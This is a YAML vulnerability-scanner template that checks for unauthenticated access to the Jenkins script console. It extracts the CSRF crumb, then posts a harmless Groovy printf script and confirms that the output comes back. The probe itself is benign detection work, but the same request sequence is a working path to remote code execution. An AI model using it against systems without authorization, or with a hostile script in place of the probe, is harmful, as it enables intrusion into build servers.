id: jenkins-unauthorized-access

info:
  name: Jenkins Unauthorized Access Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control,high
  description: |
    Detects unauthorized access to Jenkins by leveraging the script console endpoint.

variables:
  r1: "{{rand_int(1000, 9999)}}"
  r2: "{{rand_int(1000, 9999)}}"

flow: |
  http(1) && http(2)

http:
  - id: initial-request
    method: GET
    path:
      - "{{BaseURL}}/script"
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '"Jenkins-Crumb",\s?"(?P<var>.+?)"\);'
    extractors:
      - type: regex
        name: var
        internal: true
        group: 1
        regex:
          - '"Jenkins-Crumb",\s?"(?P<var>.+?)"\);'

  - id: execute-script
    method: POST
    path:
      - "{{BaseURL}}/script"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{r1}}%{{r2}}"
        part: body
